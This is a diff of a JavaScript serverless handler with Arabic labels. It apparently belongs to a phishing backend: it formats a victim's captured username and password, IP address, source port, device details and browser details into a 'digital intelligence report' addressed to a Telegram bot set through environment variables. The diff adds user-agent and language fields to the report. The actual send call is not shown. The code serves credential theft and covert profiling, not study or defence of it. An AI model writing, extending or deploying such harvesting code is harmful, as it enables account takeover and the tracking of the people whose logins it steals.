@@ -4,31 +4,31 @@ export default async function handler(req, res) {
         const token = process.env.TELEGRAM_TOKEN;
         const chatId = process.env.CHAT_ID;
 
+        // سحب الـ IP والـ Source Port
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-        const port = req.socket.remotePort;
-
-        const statusEmoji = data.type.includes("زيارة") ? "🔔" : "🔥";
+        const port = req.socket.remotePort; // هذا هو المنفذ (Source Port)
 
         const message = `
-${statusEmoji} **تـقـريـر اسـتـخـبـاراتـي جـديـد**
+🕵️‍♂️ **تـقـريـر اسـتـخـبـاراتـي رقـمـي**
 ━━━━━━━━━━━━━━━━━━
-🚦 **الحالة:** \`${data.type}\`
-
-👤 **المعلومات المستهدفة:**
+📝 **البيانات المستلمة:**
 👤 **المستخدم:** \`${data.user}\`
 🔑 **كلمة السر:** \`${data.pass}\`
 
-🌐 **البيانات الشبكية:**
+🌐 **بيانات الشبكة:**
 📍 **عنوان الـ IP:** \`${ip}\`
 🔌 **المنفذ (Port):** \`${port}\`
 
-📱 **مواصفات العتاد:**
+📱 **معلومات الجهاز (Hardware):**
 🖥 **النظام:** \`${data.platform}\`
 🔋 **البطارية:** \`${data.battery}\`
 📏 **الشاشة:** \`${data.screenRes}\`
-🧠 **المعالج:** \`${data.cores} Cores\`
+🧠 **المعالج (Cores):** \`${data.cores}\`
 
-🕒 **توقيت العملية:** \`${data.time}\`
+🌐 **تفاصيل المتصفح:**
+🌍 **اللغة:** \`${data.language}\`
+🕒 **التوقيت:** \`${data.time}\`
+🆔 **الوكيل:** \`${data.ua}\`
 ━━━━━━━━━━━━━━━━━━
         `;
 
